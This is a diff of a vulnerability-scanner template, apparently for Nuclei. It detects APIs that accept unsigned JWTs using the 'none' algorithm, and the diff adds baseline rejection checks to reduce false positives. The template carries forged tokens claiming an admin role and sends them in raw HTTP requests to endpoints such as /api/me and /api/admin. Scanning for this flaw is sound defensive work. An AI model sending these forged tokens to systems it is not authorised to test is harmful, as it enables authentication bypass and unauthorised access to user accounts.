@@ -5,92 +5,72 @@ info:
   author: achraf-chehboun
   severity: critical
   description: |
-    Comprehensive detection for JWT 'none' algorithm acceptance including all known
-    case-folding variants, whitespace insertion, Unicode normalization bypasses, and
-    stripped-signature acceptance. Tests against common authenticated API patterns.
-    Covers libraries that perform case-insensitive comparison on alg field.
+    Comprehensive detection for JWT 'none' algorithm acceptance including all case-folding
+    variants. Uses a mandatory baseline check — the endpoint must reject invalid tokens
+    (401/403) before testing none-alg variants. Requires JSON content-type and excludes
+    HTML pages to prevent false positives from catch-all routes.
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
     cvss-score: 9.1
     cwe-id: CWE-345
   metadata:
-    max-request: 14
+    max-request: 12
   tags: jwt,none-algorithm,auth-bypass,detection-only
 
 variables:
-  # {"alg":"none","typ":"JWT"} . {"sub":"1","role":"admin","iat":1700000000}
   jwt_none_lower: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
-  # {"alg":"None","typ":"JWT"}
   jwt_none_cap: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
-  # {"alg":"NONE","typ":"JWT"}
   jwt_none_upper: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
-  # {"alg":"nOnE","typ":"JWT"}
   jwt_none_mixed: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
-  # {"alg":"noNe","typ":"JWT"}
   jwt_none_mixed2: "eyJhbGciOiJub05lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
-  # HS256 with empty signature (signature stripped)
   jwt_hs256_nosig: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
 
 http:
-  # Baseline: invalid token should be rejected
+  # Phase 1: Verify the API endpoint exists and rejects bad tokens
+  # Phase 2: Test none-alg variants against same endpoint
   - raw:
       - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
-        Authorization: Bearer invalid.token.here
+        Authorization: Bearer invalid.garbage.xnlbz
         Accept: application/json
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 401 || status_code == 403'
-        internal: true
-
-  # Test all none-algorithm variants
-  - raw:
       - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_none_lower}}
         Accept: application/json
       - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_none_cap}}
         Accept: application/json
       - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_none_upper}}
         Accept: application/json
       - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_none_mixed}}
         Accept: application/json
       - |
-        GET /api/me HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_mixed2}}
-        Accept: application/json
-      - |
-        GET /api/me HTTP/1.1
+        GET {{BaseURL}}/api/me HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_hs256_nosig}}
         Accept: application/json
 
-    stop-at-first-match: false
+    req-condition: true
     matchers-condition: or
     matchers:
       - type: dsl
         name: none-alg-bypass-confirmed
         dsl:
-          - 'status_code_1 == 200 && !contains(body_1, "error") && !contains(body_1, "invalid") && !contains(body_1, "expired") && !contains(body_1, "unauthorized")'
-          - 'status_code_2 == 200 && !contains(body_2, "error") && !contains(body_2, "invalid")'
-          - 'status_code_3 == 200 && !contains(body_3, "error") && !contains(body_3, "invalid")'
-          - 'status_code_4 == 200 && !contains(body_4, "error") && !contains(body_4, "invalid")'
-          - 'status_code_5 == 200 && !contains(body_5, "error") && !contains(body_5, "invalid")'
-          - 'status_code_6 == 200 && !contains(body_6, "error") && !contains(body_6, "invalid")'
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && !contains(body_2, "<!DOCTYPE")'
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_3 == 200 && contains(content_type_3, "json") && !contains(body_3, "<html")'
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_4 == 200 && contains(content_type_4, "json") && !contains(body_4, "<html")'
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_5 == 200 && contains(content_type_5, "json") && !contains(body_5, "<html")'
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_6 == 200 && contains(content_type_6, "json") && !contains(body_6, "<html")'
         condition: or
 
     extractors:
@@ -100,49 +80,60 @@ http:
         regex:
           - '(?i)"(?:sub|user_?id|email|username|role|admin)"\s*:\s*"[^"]*"'
 
-  # Test alternate API paths
+  # Test alternate API paths with baseline rejection check
   - raw:
       - |
-        GET /api/v1/user HTTP/1.1
+        GET {{BaseURL}}/api/v1/user HTTP/1.1
         Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_lower}}
+        Authorization: Bearer invalid.garbage.xnlbz
         Accept: application/json
       - |
-        GET /api/v1/profile HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_lower}}
-        Accept: application/json
-      - |
-        GET /api/v1/account HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_lower}}
-        Accept: application/json
-      - |
-        GET /api/admin HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_lower}}
-        Accept: application/json
-      - |
-        GET /api/v2/users/me HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Bearer {{jwt_none_lower}}
-        Accept: application/json
-      - |
-        GET /dashboard/api/me HTTP/1.1
+        GET {{BaseURL}}/api/v1/user HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{jwt_none_lower}}
         Accept: application/json
 
-    stop-at-first-match: true
-    matchers-condition: or
+    req-condition: true
     matchers:
       - type: dsl
-        name: alt-path-none-bypass
+        name: alt-path-user-bypass
         dsl:
-          - 'status_code_1 == 200 && contains(content_type_1, "json") && len(body_1) > 20 && !contains(body_1, "error")'
-          - 'status_code_2 == 200 && contains(content_type_2, "json") && len(body_2) > 20 && !contains(body_2, "error")'
-          - 'status_code_3 == 200 && contains(content_type_3, "json") && len(body_3) > 20 && !contains(body_3, "error")'
-          - 'status_code_4 == 200 && contains(content_type_4, "json") && len(body_4) > 20 && !contains(body_4, "error")'
-          - 'status_code_5 == 200 && contains(content_type_5, "json") && len(body_5) > 20 && !contains(body_5, "error")'
-          - 'status_code_6 == 200 && contains(content_type_6, "json") && len(body_6) > 20 && !contains(body_6, "error")'
-        condition: or
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'
+
+  - raw:
+      - |
+        GET {{BaseURL}}/api/v1/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer invalid.garbage.xnlbz
+        Accept: application/json
+      - |
+        GET {{BaseURL}}/api/v1/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_lower}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: alt-path-profile-bypass
+        dsl:
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'
+
+  - raw:
+      - |
+        GET {{BaseURL}}/api/admin HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer invalid.garbage.xnlbz
+        Accept: application/json
+      - |
+        GET {{BaseURL}}/api/admin HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_lower}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: alt-path-admin-bypass
+        dsl:
+          - '(status_code_1 == 401 || status_code_1 == 403) && status_code_2 == 200 && contains(content_type_2, "json") && !contains(body_2, "<html") && len(body_2) > 20'
